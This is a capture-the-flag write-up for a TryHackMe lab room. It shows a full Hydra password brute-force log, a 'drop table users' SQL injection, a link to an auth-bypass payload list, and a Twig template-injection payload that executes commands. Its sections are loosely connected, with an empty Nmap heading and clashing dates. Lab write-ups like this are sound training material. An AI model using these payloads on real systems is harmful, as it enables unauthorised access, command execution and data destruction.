# 🚀 TryHackMe: Toolsrus — Write-Up  
**Room URL:** [https://tryhackme.com/room/toolsrus]
**Author:** *Irregular*  
**Date:** *14-06-2025*

---
## 📝 Overview  

> *This room is for to enhance enumeration skills and in result get access over the machine through the use of various tools *
>
> ## 🛠️ Tools Used  

-`Dirbuster`
-`Hydra`
-`Nmap`
-`Nikto`
-`Metasploit`

---
##RECON FINDINGS##

*Dirbuster*
![1](https://github.com/user-attachments/assets/59747491-483c-4faa-80ae-1f65a38d4cd5)

![image](https://github.com/user-attachments/assets/c4f2071d-138e-4741-9b26-966f57988782)
![image](https://github.com/user-attachments/assets/ab730d14-2d63-48a3-a4d7-487ad14756a0)


*hyra*
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-30 02:58:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-get://10.10.95.199:80/protected/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "iloveyou" - 5 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "princess" - 6 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "1234567" - 7 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "rockyou" - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "12345678" - 9 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "abc123" - 10 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "nicole" - 11 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "daniel" - 12 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "babygirl" - 13 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "monkey" - 14 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "lovely" - 15 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jessica" - 16 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "654321" - 17 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "michael" - 18 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "ashley" - 19 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "qwerty" - 20 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "111111" - 21 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "iloveu" - 22 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "000000" - 23 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "michelle" - 24 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "tigger" - 25 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "sunshine" - 26 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "chocolate" - 27 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "password1" - 28 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "soccer" - 29 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "anthony" - 30 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "friends" - 31 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "butterfly" - 32 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "purple" - 33 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "angel" - 34 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jordan" - 35 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "liverpool" - 36 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "justin" - 37 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "loveme" - 38 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "fuckyou" - 39 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "123123" - 40 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "football" - 41 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "secret" - 42 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "andrea" - 43 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "carlos" - 44 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "jennifer" - 45 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "joshua" - 46 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "bubbles" - 47 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "1234567890" - 48 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.95.199 - login "bob" - pass "superman" - 49 of 14344399 [child 0] (0/0)
[80][http-get] host: 10.10.95.199   login: bob   password: bubbles
[STATUS] attack finished for 10.10.95.199 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-30 02:58:47

```
*nmap*

**QUESTIONS FROM THE ROOM**
***Q1.What is the flag value after logging into the admin panel?***
for this first visited the login page and tried to intercept the request using burp suite community edition as i have the creditial already i just need to delete tha 'users' table from the database.
![burp](https://github.com/user-attachments/assets/4b049b91-d7ba-4dbd-91f8-a47abab018a4)

then, i sent the request to intruder and used the SQLi payload from `https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt`
![intrude](https://github.com/user-attachments/assets/87f756e5-f424-4b2a-8c11-158e4044b667)

![VirtualBox_kali-linux-2024 3-virtualbox-amd64_14_06_2025_17_28_03](https://github.com/user-attachments/assets/3c2707bd-d2f3-4745-8202-e8ac686963a9)

and from this i got the payload and refreshed the page and i got into it,also To get access to the admin panel for the challenge question, I need to delete the ‘users’ table. So I want to find somewhere to inject:
`drop table users -- -`
after refreshing 
 and  after logging out we use the admincredentials and _voila_
 ![VirtualBox_kali-linux-2024 3-virtualbox-amd64_14_06_2025_18_12_06](https://github.com/user-attachments/assets/b1215812-4205-4d57-8b90-abd6d115eb2d)

 ***What is the content of the hidden text file in the flags folder?***
 >for this we'll look for a SSTI on the page where the input can give us RCE or directly get the result
> ![image](https://github.com/user-attachments/assets/22a5195f-4690-4fdc-a46b-607c7bf298c4)
>![image](https://github.com/user-attachments/assets/4238b077-0755-4cc5-b98d-2c15713e6bd3)
now i'll try to get a RCE on this uing netcat as we know already that this page uses ***twig*** for the code of template injeacaation. i did some searching and foound i can use sort pass thru function.
>{{['id',""]|sort('passthru')}}
>![image](https://github.com/user-attachments/assets/6ac83e92-baa3-467a-9129-c7c1bde798b6)
and now after some chaining and iterations i got the flag
>![VirtualBox_kali-linux-2024 3-virtualbox-amd64_14_06_2025_17_28_03](https://github.com/user-attachments/assets/12047a7d-e6e7-486f-aa91-4278052bd70c)
